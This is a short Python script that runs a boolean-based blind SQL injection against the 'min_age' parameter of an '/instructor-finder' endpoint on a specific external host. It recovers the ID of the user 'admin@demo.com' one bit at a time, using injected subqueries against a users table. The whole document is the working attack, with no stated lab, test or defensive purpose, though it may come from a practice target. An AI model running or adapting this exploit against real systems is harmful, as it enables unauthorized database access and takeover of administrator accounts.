import requests
import re

# Target URL
BASE_URL = "http://ccw84s4g4cgsk440c0ssookc.72.62.122.96.sslip.io"
VULN_ENDPOINT = f"{BASE_URL}/instructor-finder"

def check(payload):
    params = {'min_age': payload, 'max_age': '100'}
    r = requests.get(VULN_ENDPOINT, params=params)
    return "No results found" not in r.text

def get_admin_id():
    print("[*] Finding admin user ID...")
    # Get ID using boolean blind
    # We'll use binary search for speed
    id_val = 0
    for i in range(16): # Up to 65535, enough
        payload = f"1) AND (SELECT (id >> {i}) & 1 FROM users WHERE email='admin@demo.com')=1 AND (1=1"
        if check(payload):
            id_val |= (1 << i)
    print(f"[+] Final Admin ID: {id_val}")
    return id_val

get_admin_id()
